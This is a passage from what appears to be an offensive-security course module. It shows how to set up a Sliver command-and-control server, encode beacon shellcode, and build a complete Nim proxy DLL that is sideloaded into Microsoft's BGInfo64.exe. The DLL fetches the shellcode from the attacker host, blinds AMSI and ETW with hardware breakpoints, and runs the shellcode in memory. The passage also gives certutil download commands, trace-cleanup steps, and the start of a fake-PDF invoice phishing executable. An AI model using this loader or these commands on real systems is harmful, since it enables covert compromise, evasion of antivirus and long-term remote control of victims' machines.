This means a behavioural rule triggered during execution. Two things to try: change the XOR key and recompile (produces a different binary, may avoid the behavioural rule that matched), or move to Method 2 which runs the shellcode inside a signed Microsoft process and is harder for Defender to flag.

### 3.8 What You Leave Behind (OPSEC)

After the session is running, these traces exist on the victim machine:
- `loader.exe` in `C:\Windows\Temp\`. Delete it once the session is stable: `sliver (corp-beacon) > rm C:\Windows\Temp\loader.exe`
- Certutil leaves a record in the Windows URL cache. Clean it up: run `certutil -urlcache -split -f http://192.168.10.10:8888/loader.exe delete` on the victim.
- Windows Prefetch records that `LOADER.EXE` ran. This is visible to forensic investigators.
- Network logs show a connection from `WORKSTATION01` to `192.168.10.10:8888` to fetch the beacon, and then regular HTTPS connections every 30 seconds to port 443.

Anyone watching network traffic will see the regular 30-second HTTPS connections from the victim to your Kali IP. The jitter makes the timing slightly unpredictable but the pattern is still visible. In a real engagement you would route C2 traffic through a domain that looks legitimate, not directly to your own IP.

---

## Part 4: Method 2 - DLL Sideloading Chain

In this method, you do not drop an executable and run it. Instead, you create a DLL file and place it next to a legitimate Microsoft program. When that Microsoft program starts, Windows automatically loads your DLL as part of its normal startup process. Your code runs inside the Microsoft program's process. Defender sees the Microsoft program running, not a random loader.

AppLocker does not have DLL rules enabled by default, so it never checks your DLL. And because your code runs inside a process that belongs to a signed Microsoft binary, Defender is much less likely to flag the activity.

### 4.1 Prerequisites: Sliver, Shellcode, and HTTP Server

Method 2 requires the same Kali-side infrastructure as Method 1. If you are starting fresh on Method 2, or you reverted your snapshots, complete these steps before building the DLL.

**Step 1: Start Sliver**

Open a terminal on Kali and connect to the Sliver daemon:

```bash
sudo systemctl start sliver
sliver
```

You should drop into the `sliver >` prompt.

**Step 2: Start the HTTPS C2 listener**

Inside the Sliver console:

```
sliver > https --lhost 192.168.10.10 --lport 443
```

Verify it is running:

```
sliver > jobs
```

Expected output:

```
 ID  Name   Protocol  Port
==  =====  ========  ====
 1   https  tcp       443
```

If job 1 already exists from Method 1, skip this step. The same listener handles beacons from any method.

**Step 3: Generate the beacon shellcode**

If `/tmp/beacon.bin` already exists from Method 1, skip to Step 4.

```
sliver > generate beacon --http https://192.168.10.10:443 --os windows --arch amd64 --format shellcode --shellcode-encoder none --skip-symbols --seconds 30 --jitter 10 --save /tmp/beacon.bin
```

This takes 30 to 90 seconds. When it finishes:

```bash
ls -la /tmp/beacon.bin
```

**Step 4: XOR-encode the shellcode**

If `/tmp/beacon_encoded.bin` already exists from Method 1, skip this step.

```bash
python3 /tmp/xor_encode.py
ls -la /tmp/beacon_encoded.bin
```

If you do not have the encode script, create it:

```bash
cat > /tmp/xor_encode.py << 'EOF'
#!/usr/bin/env python3
XOR_KEY = 0xAB
with open('/tmp/beacon.bin', 'rb') as f:
    data = f.read()
encoded = bytes([b ^ XOR_KEY for b in data])
with open('/tmp/beacon_encoded.bin', 'wb') as f:
    f.write(encoded)
print(f"Encoded {len(data)} bytes -> /tmp/beacon_encoded.bin")
EOF
python3 /tmp/xor_encode.py
```

**Step 5: Start the HTTP server**

The DLL loader fetches the beacon shellcode from Kali at runtime. Open a new terminal (leave the Sliver terminal alone):

```bash
cd /tmp
python3 -m http.server 8888
```

Leave this running. Verify the shellcode file is accessible:

```bash
curl -s -o /dev/null -w "%{http_code}" http://192.168.10.10:8888/beacon_encoded.bin
```

This should return `200`. If it returns `404`, the file does not exist in `/tmp/` yet.

---

### 4.2 What DLL Sideloading Is

Every Windows application depends on DLL files. DLL stands for Dynamic Link Library. A DLL is a file that contains code shared between multiple programs. When an application starts, Windows finds the DLLs that the application needs and loads them into memory.

Windows searches for DLLs in a specific order:

1. The folder where the executable file is located
2. The System32 folder (`C:\Windows\System32\`)
3. The System folder (`C:\Windows\System\`)
4. The Windows folder (`C:\Windows\`)
5. The current working folder
6. Folders listed in the PATH environment variable

Step 1 is the important one. Windows looks in the application's own folder first, before it looks anywhere else. This means if a program in `C:\Program Files\SomeApp\` needs a file called `version.dll`, Windows checks whether `C:\Program Files\SomeApp\version.dll` exists. If it does, Windows loads that file. If it does not, Windows moves on to System32.

Sideloading takes advantage of this search order. You:
1. Find a legitimate Microsoft program that loads a DLL by name without giving a full path
2. Put your malicious DLL in the same folder as that program, using the exact same filename
3. Run the legitimate program. It picks up your DLL from its own folder instead of the real system DLL.
4. Your DLL's startup function (`DllMain`) runs automatically. That is where you put your shellcode runner.

The program that loads your DLL is signed and trusted, so Defender does not immediately treat it as suspicious. AppLocker has no DLL rules configured in the default setup, so AppLocker never checks your DLL file at all.

### 4.2 DLL Proxying: Keeping the Application Working

There is a problem with placing a malicious DLL next to a program. If the program needs to call functions from that DLL, and your malicious DLL does not have those functions, the program will crash. A crash is noisy. The user notices. An administrator might investigate.

The solution is DLL proxying. Your malicious DLL:
1. Exports all the same function names that the real DLL exports
2. Loads the real DLL from the same folder (renamed to `version_real.dll` so it does not conflict)
3. Passes all incoming function calls through to the real DLL so the application works normally
4. Runs your shellcode inside `DllMain` before passing control to the application

The application works exactly as expected. The user sees nothing unusual. Your shellcode is running inside the background thread of a signed Microsoft process.

### 4.3 Choosing the Target Program and DLL

You need a signed Microsoft program that:
- Is located in, or can be placed in, a path that AppLocker trusts
- Loads a DLL by name only, not by full path, so the search order applies
- Can be placed in a folder that a standard user can write to

For this lab you will use **BGInfo64.exe** from Microsoft Sysinternals.

**What BGInfo is:** A Microsoft tool that shows system information on the Windows desktop background. It is signed by Microsoft. IT administrators use it on servers to display the computer name, IP address, and operating system version on the desktop wallpaper. Security teams often whitelist it because it is a legitimate admin tool.

**Why BGInfo works here:** When BGInfo64.exe starts, it loads `version.dll` from the same folder it is in. `version.dll` is the Windows Version API library. BGInfo uses it to read the Windows version number for display. You will place BGInfo64.exe in `C:\Windows\Temp\` together with your malicious `version.dll`. When BGInfo starts, it loads your DLL from that folder instead of the real one from System32.

**Download BGInfo on Kali:**

```bash
curl -L -o /tmp/BGInfo.zip "https://download.sysinternals.com/files/BGInfo.zip"
unzip /tmp/BGInfo.zip -d /tmp/bginfo/
ls /tmp/bginfo/
```

You should see `Bginfo64.exe` in the extracted directory.

**Alternatively, download on the victim:**

On `WORKSTATION01` as `CORP\vamsi`, open PowerShell:

```powershell
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/BGInfo.zip" -OutFile "$env:TEMP\BGInfo.zip"
Expand-Archive -Path "$env:TEMP\BGInfo.zip" -DestinationPath "C:\Windows\Temp\bginfo\"
dir C:\Windows\Temp\bginfo\
```

You should see `Bginfo64.exe`, `Bginfo.exe`, and the EULA file.

### 4.4 Finding What DLLs BGInfo Loads (Using Process Monitor)

This step teaches you the process for finding sideloadable DLLs in any application. You need **Process Monitor** (also from Sysinternals) to watch what DLLs a process tries to load and WHERE it looks for them.

Download Process Monitor on the victim:

```powershell
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/ProcessMonitor.zip" -OutFile "$env:TEMP\ProcessMonitor.zip"
Expand-Archive -Path "$env:TEMP\ProcessMonitor.zip" -DestinationPath "C:\Windows\Temp\procmon\"
```

AppLocker allows this because it is in `C:\Windows\Temp\` and the executables are Microsoft-signed.

Run Process Monitor (you will see a UAC prompt - this requires admin, so accept or enter admin credentials):

```
C:\Windows\Temp\procmon\Procmon64.exe
```

In Process Monitor, set a filter to only show DLL-related events:

1. Go to **Filter** menu -> **Filter...**
2. Add a filter: `Operation` `is` `Load Image` -> then click **Add**
3. Add another: `Process Name` `is` `Bginfo64.exe` -> **Add**
4. Click **OK**

Now run BGInfo64:

```
C:\Windows\Temp\bginfo\Bginfo64.exe /timer:0
```

`/timer:0` tells BGInfo to apply immediately without waiting.

Watch Process Monitor. You will see all the DLLs Bginfo64.exe loads. Look for DLLs that show `PATH NOT FOUND` or `NAME NOT FOUND` status in the Bginfo64 directory before finding them in System32. These are your sideloading candidates.

You will see BGInfo trying to load `version.dll` from `C:\Windows\Temp\bginfo\` first, failing to find it, then loading it from `C:\Windows\System32\`. This confirms the sideloading opportunity.

### 4.5 Write the Proxy DLL in Nim

On Kali, create the DLL source file:

```bash
nano /tmp/version_proxy.nim
```

This DLL does three things:
1. In `DllMain`, when attached to a process, spawn a thread that runs your shellcode
2. Load the real `version.dll` (which you will rename to `version_real.dll`) 
3. Forward all `version.dll` function calls to the real DLL so BGInfo keeps working

```nim
import winim/lean
import winim/winstr
import os
import httpclient

# ============================================================
# CONFIGURATION
# ============================================================
const KALI_IP   = "192.168.10.10"
const KALI_PORT = "8888"
const SC_PATH   = "/beacon_encoded.bin"
const XOR_KEY   = 0xAB.byte

# Handle to the real version.dll (renamed version_real.dll)
var realVersionDll: HMODULE = 0

# ============================================================
# FORWARD DECLARATIONS
# All functions that version.dll exports must be declared
# here so that applications that need them do not crash.
# Each one loads and calls the real function from version_real.dll
# ============================================================

proc GetFileVersionInfoA*(
  lptstrFilename: LPCSTR,
  dwHandle: DWORD,
  dwLen: DWORD,
  lpData: LPVOID
): BOOL {.stdcall, exportc, dynlib.} =
  if realVersionDll != 0:
    type FnType = proc(a: LPCSTR, b: DWORD, c: DWORD, d: LPVOID): BOOL {.stdcall.}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "GetFileVersionInfoA"))
    if fn != nil: return fn(lptstrFilename, dwHandle, dwLen, lpData)
  return FALSE

proc GetFileVersionInfoW*(
  lptstrFilename: LPCWSTR,
  dwHandle: DWORD,
  dwLen: DWORD,
  lpData: LPVOID
): BOOL {.stdcall, exportc, dynlib.} =
  if realVersionDll != 0:
    type FnType = proc(a: LPCWSTR, b: DWORD, c: DWORD, d: LPVOID): BOOL {.stdcall.}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "GetFileVersionInfoW"))
    if fn != nil: return fn(lptstrFilename, dwHandle, dwLen, lpData)
  return FALSE

proc GetFileVersionInfoSizeA*(
  lptstrFilename: LPCSTR,
  lpdwHandle: LPDWORD
): DWORD {.stdcall, exportc, dynlib.} =
  if realVersionDll != 0:
    type FnType = proc(a: LPCSTR, b: LPDWORD): DWORD {.stdcall.}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "GetFileVersionInfoSizeA"))
    if fn != nil: return fn(lptstrFilename, lpdwHandle)
  return 0

proc GetFileVersionInfoSizeW*(
  lptstrFilename: LPCWSTR,
  lpdwHandle: LPDWORD
): DWORD {.stdcall, exportc, dynlib.} =
  if realVersionDll != 0:
    type FnType = proc(a: LPCWSTR, b: LPDWORD): DWORD {.stdcall.}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "GetFileVersionInfoSizeW"))
    if fn != nil: return fn(lptstrFilename, lpdwHandle)
  return 0

proc VerQueryValueA*(
  pBlock: LPCVOID,
  lpSubBlock: LPCSTR,
  lplpBuffer: ptr LPVOID,
  puLen: ptr UINT
): BOOL {.stdcall, exportc, dynlib.} =
  if realVersionDll != 0:
    type FnType = proc(a: LPCVOID, b: LPCSTR, c: ptr LPVOID, d: ptr UINT): BOOL {.stdcall.}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "VerQueryValueA"))
    if fn != nil: return fn(pBlock, lpSubBlock, lplpBuffer, puLen)
  return FALSE

proc VerQueryValueW*(
  pBlock: LPCVOID,
  lpSubBlock: LPCWSTR,
  lplpBuffer: ptr LPVOID,
  puLen: ptr UINT
): BOOL {.stdcall, exportc, dynlib.} =
  if realVersionDll != 0:
    type FnType = proc(a: LPCVOID, b: LPCWSTR, c: ptr LPVOID, d: ptr UINT): BOOL {.stdcall.}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "VerQueryValueW"))
    if fn != nil: return fn(pBlock, lpSubBlock, lplpBuffer, puLen)
  return FALSE

proc VerLanguageNameA*(
  wLang: DWORD,
  szLang: LPSTR,
  nSize: DWORD
): DWORD {.stdcall, exportc, dynlib.} =
  if realVersionDll != 0:
    type FnType = proc(a: DWORD, b: LPSTR, c: DWORD): DWORD {.stdcall.}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "VerLanguageNameA"))
    if fn != nil: return fn(wLang, szLang, nSize)
  return 0

proc VerLanguageNameW*(
  wLang: DWORD,
  szLang: LPWSTR,
  nSize: DWORD
): DWORD {.stdcall, exportc, dynlib.} =
  if realVersionDll != 0:
    type FnType = proc(a: DWORD, b: LPWSTR, c: DWORD): DWORD {.stdcall.}
    let fn = cast[FnType](GetProcAddress(realVersionDll, "VerLanguageNameW"))
    if fn != nil: return fn(wLang, szLang, nSize)
  return 0

# ============================================================
# HARDWARE BREAKPOINT BYPASS (same technique as Method 1)
# No memory patching. No VirtualProtect on DLL code.
# Uses CPU debug registers to intercept AMSI and ETW.
# ============================================================
var amsiScanBufferAddr: pointer = nil
var etwEventWriteAddr: pointer = nil

proc hwbpHandler(exInfo: PEXCEPTION_POINTERS): LONG {.stdcall.} =
  let rec = exInfo.ExceptionRecord
  let ctx = exInfo.ContextRecord
  if rec.ExceptionCode != STATUS_SINGLE_STEP:
    return EXCEPTION_CONTINUE_SEARCH
  let faultAddr = cast[pointer](ctx.Rip)
  if faultAddr == amsiScanBufferAddr:
    ctx.Rax = cast[DWORD64](0x80070057)
    ctx.Rip = cast[DWORD64](cast[ptr DWORD64](ctx.Rsp)[])
    ctx.Rsp = ctx.Rsp + 8
    ctx.EFlags = ctx.EFlags or 0x10000
    return EXCEPTION_CONTINUE_EXECUTION
  elif faultAddr == etwEventWriteAddr:
    ctx.Rax = 0
    ctx.Rip = cast[DWORD64](cast[ptr DWORD64](ctx.Rsp)[])
    ctx.Rsp = ctx.Rsp + 8
    ctx.EFlags = ctx.EFlags or 0x10000
    return EXCEPTION_CONTINUE_EXECUTION
  return EXCEPTION_CONTINUE_SEARCH

proc setHardwareBreakpoints() =
  let amsiDll = LoadLibraryA("amsi.dll")
  if amsiDll != 0:
    amsiScanBufferAddr = GetProcAddress(amsiDll, "AmsiScanBuffer")
  let ntdll = GetModuleHandleA("ntdll.dll")
  if ntdll != 0:
    etwEventWriteAddr = GetProcAddress(ntdll, "EtwEventWrite")
  discard AddVectoredExceptionHandler(1, hwbpHandler)
  var ctx: CONTEXT
  ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
  let hThread = GetCurrentThread()
  discard GetThreadContext(hThread, addr ctx)
  if amsiScanBufferAddr != nil:
    ctx.Dr0 = cast[DWORD64](amsiScanBufferAddr)
  if etwEventWriteAddr != nil:
    ctx.Dr1 = cast[DWORD64](etwEventWriteAddr)
  ctx.Dr7 = 0x00000005
  discard SetThreadContext(hThread, addr ctx)

# ============================================================
# SHELLCODE RUNNER - runs in a separate thread
# We run this in a thread from DllMain to avoid holding
# the loader lock (DllMain must return quickly).
# Inside this thread, we use callback execution instead
# of CreateThread for the actual shellcode.
# ============================================================
proc shellcodeThread(param: LPVOID): DWORD {.stdcall.} =
  # Small delay so the host process finishes loading
  sleep(500)

  # Install HWBP-based AMSI/ETW bypass
  setHardwareBreakpoints()

  let url = "http://" & KALI_IP & ":" & KALI_PORT & SC_PATH
  var client = newHttpClient()
  var encoded: string
  try:
    encoded = client.getContent(url)
  except:
    return 0

  if encoded.len == 0:
    return 0

  # XOR decode
  var shellcode = newSeq[byte](encoded.len)
  for i in 0 ..< encoded.len:
    shellcode[i] = cast[byte](encoded[i]) xor XOR_KEY

  let scLen = shellcode.len.SIZE_T

  # Allocate RW, write, wipe heap copy, flip to RX
  let mem = VirtualAlloc(nil, scLen, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if mem == nil: return 0

  copyMem(mem, addr shellcode[0], shellcode.len)
  zeroMem(addr shellcode[0], shellcode.len)
  sleep(500)

  var oldProtect: DWORD = 0
  discard VirtualProtect(mem, scLen, PAGE_EXECUTE_READ, addr oldProtect)

  # Execute via callback, not CreateThread
  discard EnumSystemLocalesA(
    cast[LOCALE_ENUMPROCA](mem),
    LCID_INSTALLED
  )

  return 0

# ============================================================
# DllMain - Windows calls this automatically when the DLL loads
# fdwReason tells you WHY DllMain was called:
#   DLL_PROCESS_ATTACH = the DLL was just loaded into a process
#   DLL_PROCESS_DETACH = the DLL is being unloaded
#   DLL_THREAD_ATTACH  = a new thread started in the process
#   DLL_THREAD_DETACH  = a thread ended
# ============================================================
proc DllMain*(
  hinstDLL: HINSTANCE,
  fdwReason: DWORD,
  lpvReserved: LPVOID
): BOOL {.stdcall, exportc, dynlib.} =

  case fdwReason
  of DLL_PROCESS_ATTACH:
    # Load the real version.dll (renamed to version_real.dll)
    # This must happen BEFORE we do anything else
    # so that forwarded function calls work immediately
    realVersionDll = LoadLibraryA("version_real.dll")

    # Spawn a thread to run our shellcode
    # We cannot do heavy work directly in DllMain because
    # Windows holds the loader lock during DllMain execution.
    # Doing blocking operations here can deadlock the process.
    # A new thread runs our shellcode safely outside the lock.
    var threadId: DWORD = 0
    discard CreateThread(
      nil,
      0,
      cast[LPTHREAD_START_ROUTINE](shellcodeThread),
      nil,
      0,
      addr threadId
    )

  of DLL_PROCESS_DETACH:
    # Clean up: release the real DLL when ours is unloaded
    if realVersionDll != 0:
      discard FreeLibrary(realVersionDll)

  else:
    discard

  return TRUE
```

Save the file.

### 4.6 Compile the Proxy DLL

```bash
nim c \
  -d:mingw \
  -d:release \
  --opt:size \
  --app:lib \
  --passL:-s \
  --cpu:amd64 \
  --nomain \
  -o:/tmp/version.dll \
  /tmp/version_proxy.nim
```

Key difference from the EXE compile command:
- `--app:lib` tells Nim to compile as a DLL (shared library) instead of an executable
- `--nomain` prevents Nim from generating a `main` entry point (DLLs use `DllMain`, not `main`)
- `-o:/tmp/version.dll` output filename is `version.dll` (exactly what BGInfo will look for)

Check the output:

```bash
ls -la /tmp/version.dll
file /tmp/version.dll
```

The file command should show: `PE32+ executable (DLL) (GUI) x86-64, for MS Windows`.

### 4.7 Set Up the Sideloading Chain on the Victim

You need three files in the same directory:
1. `Bginfo64.exe` - the signed Microsoft binary (already downloaded)
2. `version.dll` - your malicious proxy DLL (compiled above)
3. `version_real.dll` - the real System32 version.dll (renamed so your proxy can forward calls to it)

On the Kali HTTP server (still running on port 8888 from `/tmp/`), your `version.dll` is at `http://192.168.10.10:8888/version.dll`.

On the victim, as `CORP\vamsi`, run these commands:

```cmd
:: Download your malicious version.dll to the bginfo directory
certutil.exe -urlcache -split -f http://192.168.10.10:8888/version.dll C:\Windows\Temp\bginfo\version.dll

:: Copy the real version.dll from System32 and rename it
copy C:\Windows\System32\version.dll C:\Windows\Temp\bginfo\version_real.dll
```

Verify the directory:

```cmd
dir C:\Windows\Temp\bginfo\
```

You should see:
```
Bginfo64.exe      (signed Microsoft binary)
version.dll       (your malicious proxy DLL)
version_real.dll  (real version.dll, renamed)
Eula.txt
```

### 4.8 Trigger the Sideload

Make sure your Sliver HTTPS listener is still running on Kali (check with `sliver > jobs`). If it stopped, restart it:

```
sliver > https --lhost 192.168.10.10 --lport 443
```

On the victim, run BGInfo:

```cmd
C:\Windows\Temp\bginfo\Bginfo64.exe /timer:0 /silent
```

`/silent` suppresses the BGInfo GUI. BGInfo runs, loads your `version.dll`, your DLL's `DllMain` fires, a thread is created, the shellcode runner fetches the encoded Sliver beacon from Kali, decodes it, and runs it directly. The beacon starts checking in on port 443.

After about 5 to 10 seconds, check Sliver on Kali:

```
sliver > beacons
```

You should see a new beacon appear. The hostname shows `WORKSTATION01` and the username shows `CORP\vamsi`. Open it:

```
sliver > use <beacon-id>
```

Then queue a command to confirm the process name:

```
sliver (BEACON_NAME) > ps
```

Wait for the next check-in. In the output, you will see `Bginfo64.exe` listed. That is the process your beacon is running inside.

### 4.9 Why This Is Harder to Detect Than Method 1

**What Defender sees:**
- A signed Microsoft binary (`Bginfo64.exe`) starts running
- It loads `version.dll` from its own directory
- The DLL fires a thread
- That thread makes an outbound HTTP connection
- Then it allocates memory and runs code

**Where Defender struggles:**
- The parent process is signed and trusted. Defender does not flag the process itself.
- The DLL is not signed, but AppLocker DLL rules are off, so AppLocker is silent.
- The HTTP connection comes FROM a trusted signed process, which is less suspicious than an unknown exe making a connection.
- ETW is patched so memory operation telemetry is suppressed.

**What still makes noise:**
- An unsigned DLL loaded from a non-standard path. Defender's cloud intelligence may flag this if it is novel.
- The outbound HTTP connection from bginfo64.exe to `192.168.10.10:8888` to fetch the beacon. This is unusual network behavior for a desktop customization tool.
- If Defender has file-hash-based blocking on your specific `version.dll`, it will catch it. Recompile with different constants to change the hash.

### 4.10 OPSEC Note for Method 2

What you leave behind:
- `version.dll` and `version_real.dll` in `C:\Windows\Temp\bginfo\`
- An entry in Prefetch: `BGINFO64.EXE`
- Sysmon event 7 (ImageLoaded): `version.dll` loaded from a non-standard path into `Bginfo64.exe`
- Network logs: HTTP request from `Bginfo64.exe` to `192.168.10.10:8888` (fetching beacon) and HTTPS to `:443` (C2 check-ins)

To clean up the DLL files after the beacon is stable:

```
sliver (BEACON_NAME) > rm C:\Windows\Temp\bginfo\version.dll
sliver (BEACON_NAME) > rm C:\Windows\Temp\bginfo\version_real.dll
```

Deleting the files does not kill the beacon. The shellcode is already running in memory inside Bginfo64.exe. The DLLs only needed to exist long enough to be loaded.

---

## Part 5: Verify and Interact With Your Beacon

Whether you used Method 1 or Method 2, your Sliver beacon is now live. Here is how to work with it.

### 5.1 List Beacons and Connect

```
sliver > beacons
```

```
 ID         Name                  Transport  Hostname       Username    Operating System  Last Check-In  Next Check-In
========== ==================== ========== ============= =========== ================ ============= =============
 0e66afcc   COMPULSORY_DOORKNOB   http(s)    WORKSTATION01  CORP\vamsi  windows/amd64     5s             25s
```

Connect to your beacon:

```
sliver > use 0e66afcc
```

Replace `0e66afcc` with your actual beacon ID.

### 5.2 Basic Beacon Commands

Beacons are asynchronous. When you type a command, Sliver queues it and delivers it on the next check-in (up to 30 seconds later). You type the command, see a "Tasked" message, then wait. When the beacon checks in, it runs the command and returns the result.

Run these to confirm everything is working:

```
sliver (BEACON_NAME) > info
```
Wait for the next check-in. Shows: hostname, username, OS, process name, PID, architecture.

```
sliver (BEACON_NAME) > whoami
```
Wait. Output: `corp\vamsi`

```
sliver (BEACON_NAME) > getuid
```
Wait. Output: your SID and group memberships.

```
sliver (BEACON_NAME) > ps
```
Wait. Lists all running processes. Note what is running. You will use this in the situational awareness module.

```
sliver (BEACON_NAME) > netstat
```
Wait. Shows network connections from the victim.

```
sliver (BEACON_NAME) > ifconfig
```
Wait. Shows network interfaces and IP addresses.

```
sliver (BEACON_NAME) > pwd
```
Wait. Shows the current working directory and the token context (which user account).

```
sliver (BEACON_NAME) > ls
```
Wait. Lists files in the current directory.

### 5.3 Run a Shell Command

```
sliver (BEACON_NAME) > shell
```

This drops you into an interactive `cmd.exe` on the victim. Note: in beacon mode, the shell waits until the next check-in to open. Type `exit` to return to Sliver.

Or run a single command without a full shell:

```
sliver (BEACON_NAME) > execute -o whoami /all
```

`-o` captures the output and returns it on the next check-in. `whoami /all` shows your full token including privileges. This is important for module 07 (privilege escalation).

### 5.4 Understand Beacon vs Session Mode

Sliver has two implant types:

**Beacon mode (what you have now):** The implant checks in on a schedule (every 30 to 40 seconds in this setup). Between check-ins, there is no active connection. Commands are queued and run on the next check-in. This is harder to detect on the network because the connection pattern looks like normal periodic web traffic. For real engagements, beacon mode is what you want.

**Session mode:** The implant keeps a permanent open connection to the C2 server. Commands run and return results immediately with no delay. This is convenient for fast interactive work, but the permanent open connection is visible to anyone monitoring the network. You would not use session mode in a real engagement.

You are using beacon mode throughout this course. The 30-second wait between commands is intentional. On a real engagement you would lower the check-in interval while active and raise it while idle to reduce noise.

---

---

## Part 6: Method 3 - The Fake PDF (EXE Disguised as a Document)

This method combines social engineering with your Nim loader. The file IS your loader, but it looks, feels, and behaves like a PDF to the user. When they double-click it, a real PDF opens on screen. In the background, your shellcode runs and the beacon fires.

This is the technique used in CRTO with Cobalt Strike. You are doing the same thing with Nim and Sliver.

### 6.1 How It Works

The attack chain:

```
1. User receives "Invoice_June2026.pdf" (actually an .exe with a PDF icon)
2. User double-clicks it
3. The Nim loader starts running
4. First thing it does: extract an embedded real PDF from inside itself
   and save it to a temp folder
5. It opens that PDF with the default PDF reader (Adobe, Edge, whatever)
6. User sees a real PDF document open - they think everything is normal
7. In the background (same process), the loader installs hardware
   breakpoints on ETW/AMSI, fetches the Sliver beacon shellcode, decodes
   it, and runs it via callback execution
8. Beacon fires. User is reading the PDF. They have no idea.
```

The key insight: the user never sees a command prompt. They never see anything suspicious. They see a PDF open. That is it.

### 6.2 Why This Works Against Defender

- The binary has a unique hash (custom Nim code)
- The PDF icon makes it visually indistinguishable from a real PDF in Explorer
- Windows hides file extensions by default, so `Invoice_June2026.pdf.exe` shows as `Invoice_June2026.pdf`
- Opening a real PDF legitimizes the process: the user sees exactly what they expected
- The shellcode work happens after the PDF opens, so even if the user watches Task Manager, they see their PDF reader start (normal behavior)

### 6.3 Prerequisites: Sliver, Shellcode, and HTTP Server

Method 3 needs the same Kali-side infrastructure as Methods 1 and 2. If you are starting fresh on Method 3, or you reverted your snapshots, complete these steps before building the loader.

**Step 1: Start Sliver**

Open a terminal on Kali and connect to the Sliver daemon:

```bash
sudo systemctl start sliver
sliver
```

You should drop into the `sliver >` prompt.

**Step 2: Start the HTTPS C2 listener**

Inside the Sliver console:

```
sliver > https --lhost 192.168.10.10 --lport 443
```

Verify it is running:

```
sliver > jobs
```

Expected output:

```
 ID  Name   Protocol  Port
==  =====  ========  ====
 1   https  tcp       443
```

If job 1 already exists from a previous method, skip this step. The same listener handles beacons from any method.

**Step 3: Generate the beacon shellcode**

If `/tmp/beacon.bin` already exists from Method 1 or 2, skip to Step 4.

```
sliver > generate beacon --http https://192.168.10.10:443 --os windows --arch amd64 --format shellcode --shellcode-encoder none --skip-symbols --seconds 30 --jitter 10 --save /tmp/beacon.bin
```

This takes 30 to 90 seconds. When it finishes:

```bash
ls -la /tmp/beacon.bin
```

**Step 4: XOR-encode the shellcode**

If `/tmp/beacon_encoded.bin` already exists from Method 1 or 2, skip this step.

```bash
python3 /tmp/xor_encode.py
ls -la /tmp/beacon_encoded.bin
```

If you do not have the encode script from earlier, create it:

```bash
cat > /tmp/xor_encode.py << 'EOF'
#!/usr/bin/env python3
XOR_KEY = 0xAB
with open('/tmp/beacon.bin', 'rb') as f:
    data = f.read()
encoded = bytes([b ^ XOR_KEY for b in data])
with open('/tmp/beacon_encoded.bin', 'wb') as f:
    f.write(encoded)
print(f"Encoded {len(data)} bytes -> /tmp/beacon_encoded.bin")
EOF
python3 /tmp/xor_encode.py
```

**Step 5: Start the HTTP server**

The loader fetches both the beacon shellcode and the decoy PDF from Kali at runtime. Serve them from `/tmp/` on port 8888. Open a new terminal (leave the Sliver terminal alone):

```bash
cd /tmp
python3 -m http.server 8888
```

Leave this running. Verify both files are accessible:

```bash
# In a third terminal
curl -s -o /dev/null -w "%{http_code}" http://192.168.10.10:8888/beacon_encoded.bin
curl -s -o /dev/null -w "%{http_code}" http://192.168.10.10:8888/decoy_invoice.pdf
```

Both should return `200`. If either returns `404`, the file does not exist in `/tmp/` yet.

---

### 6.4 Prepare the Decoy PDF

Use any real PDF you already have. The content does not matter for the lab. In a real engagement, the document should match the pretext convincingly.

Copy your PDF to the expected path:

```bash
cp /path/to/your/real.pdf /tmp/decoy_invoice.pdf
```

If you are on Kali and have no PDF at hand, you can pull any document that is already on the machine:

```bash
# Kali ships some PDF documentation; pick any one of them
cp /usr/share/doc/nmap/README.md /tmp/decoy_invoice.pdf  # fallback: not a PDF but works for lab

# Better: if libreoffice is installed, convert a text file
libreoffice --headless --convert-to pdf --outdir /tmp /path/to/any/document.docx
```

The simplest option if you have nothing else available is to use `enscript` and `ps2pdf`, which ship with Kali:

```bash
echo 'Invoice\n\nAmount Due: Rs. 10,50,000\nDue Date: July 19, 2026' | enscript -o /tmp/decoy_invoice.ps
ps2pdf /tmp/decoy_invoice.ps /tmp/decoy_invoice.pdf
```

Verify the file is a valid PDF before continuing:

```bash
file /tmp/decoy_invoice.pdf
# Expected: /tmp/decoy_invoice.pdf: PDF document, version ...
```

If `file` does not say `PDF document`, the conversion failed. Check which of the above tools is available on your Kali instance and retry.

### 6.4 Convert the PDF to a Nim Byte Array

You need to embed the PDF inside your Nim binary as raw bytes. Create a Python script to convert the PDF to a Nim array:

```bash
nano /tmp/pdf_to_nim.py
```

```python
#!/usr/bin/env python3
# Converts a binary file to a Nim byte array declaration

with open('/tmp/decoy_invoice.pdf', 'rb') as f:
    data = f.read()

print(f"const decoyPdfLen = {len(data)}")
print(f"var decoyPdf: array[{len(data)}, byte] = [")
hex_vals = [f"0x{b:02X}" for b in data]
for i in range(0, len(hex_vals), 16):
    row = hex_vals[i:i+16]
    print("  " + ", ".join(row) + ",")
print("]")
```

```bash
python3 /tmp/pdf_to_nim.py > /tmp/decoy_bytes.nim
```

This creates a file containing the full PDF as a Nim byte array. You will paste this into your loader.

### 6.5 Create a PDF Icon Resource File

Windows executables can have custom icons embedded in them. To make the loader look like a PDF in Windows Explorer, you need a PDF-like icon compiled into a `.res` resource file.

Create the icon resource script:

```bash
cat > /tmp/pdf_icon.rc << 'EOF'
1 ICON "pdf_icon.ico"
EOF
```

Generate the icon locally using ImageMagick, which ships with Kali. This avoids relying on any external download:

```bash
# Create a 256x256 red rectangle with white PDF text
# This is a functional placeholder icon that will show as a colored file icon
convert -size 256x256 xc:#CC0000 \
  -fill white -font DejaVu-Sans-Bold -pointsize 72 \
  -gravity center -annotate 0 'PDF' \
  /tmp/pdf_icon_256.png

# Convert to .ico format (ICO requires specific sizes)
convert /tmp/pdf_icon_256.png \
  -define icon:auto-resize=256,128,64,48,32,16 \
  /tmp/pdf_icon.ico

# Verify it is a real ICO file
file /tmp/pdf_icon.ico
# Expected: /tmp/pdf_icon.ico: MS Windows icon resource
```

If `file` does not say `MS Windows icon resource`, the conversion failed. Check that ImageMagick is installed:

```bash
convert --version
